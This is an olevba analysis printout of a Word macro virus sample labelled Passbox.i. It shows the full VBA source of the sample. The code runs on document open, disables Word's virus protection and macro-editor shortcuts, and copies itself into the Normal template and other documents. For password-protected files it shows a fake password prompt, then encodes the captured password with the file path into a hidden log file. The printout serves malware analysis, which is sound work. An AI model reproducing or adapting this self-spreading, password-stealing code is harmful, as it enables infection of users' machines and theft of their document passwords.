olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sniffer.bas 
in file: Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba - OLE stream: 'Macros/VBA/Sniffer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Fim
Lab
Infecta

Fim:
End Sub
Sub Infecta()
On Error GoTo Final
       
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Application.EnableCancelKey = wdCancelDisabled
   CustomizationContext = NormalTemplate
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
   
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate
   DocumentInstalled = False
   GlobalInstalled = False
   
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = "Sniffer" Then
         DocumentInstalled = True
      End If
   Next

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "Sniffer" Then
         GlobalInstalled = True
      End If
   Next
   
      If DocumentInstalled = False Then
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Sniffer", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If GlobalInstalled = False Then
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Sniffer", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PBox.Show
      
Final:
    End Sub
Sub Lab()
On Error GoTo Fim

a$ = Space$(140) & "."
For r = 1 To Len(a$) Step 2
C$ = Right$(a$, r)
  For S = 1 To 20000
  Next S
StatusBar = (C$)
Next r

Fim:
End Sub

Sub Confere()
If PBox.TextBox1 = "" Then
   ActiveDocument.Close
   Unload PBox
   Else
   Grava
End If

End Sub
Sub Grava()
On Error Resume Next
Dim NJ
NJ = " Path: " & ActiveDocument.FullName & " <-> Senha: " & PBox.TextBox1
        For XY = 1 To Len(NJ)
                B = Asc(Mid(NJ, XY, 1))
                If C = 255 Then C = 148
                C = B - (92 * 3)
                If C < 0 Then C = C + 255
                If C = 165 Then C = 58
                D$ = D$ + Chr(C)
        Next XY
 
SetAttr "C:\MSDOS.SDX", 0
Open "C:\MSDOS.SDX" For Append As #1
Print #1, D$
Close #1
SetAttr "C:\MSDOS.SDX", 1 + 2 + 4
Unload PBox

End Sub

Sub ToolsMacro()
On Error GoTo Final

Final:
End Sub
Sub ViewVBCode()
On Error GoTo Final

Final:
End Sub
Sub FileTemplates()
On Error GoTo Fim

Fim:
End Sub




-------------------------------------------------------------------------------
VBA MACRO PBox.frm 
in file: Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba - OLE stream: 'Macros/VBA/PBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



















































Private Sub CommandButton1_Click()
If CommandButton1.Caption = "OK" Then Confere
End Sub
Private Sub TextBox1_Change()
TextBox1.PasswordChar = "*"

End Sub
Private Sub UserForm_Initialize()
Label2.Caption = "Insira a senha para abrir o arquivo"
Label1.Caption = ActiveDocument.FullName

End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
On Error GoTo Final
If CloseMode = 1 Then GoTo Final
ActiveDocument.Close
Unload PBox

Final:
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba' - OLE stream: 'Macros/PBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancelar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba' - OLE stream: 'Macros/PBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba' - OLE stream: 'Macros/PBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba' - OLE stream: 'Macros/PBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba' - OLE stream: 'Macros/PBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba' - OLE stream: 'Macros/PBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba' - OLE stream: 'Macros/PBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Passbox.i-3d660b35ff691d19ed428033a93a867c7efed0ba' - OLE stream: 'Macros/PBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

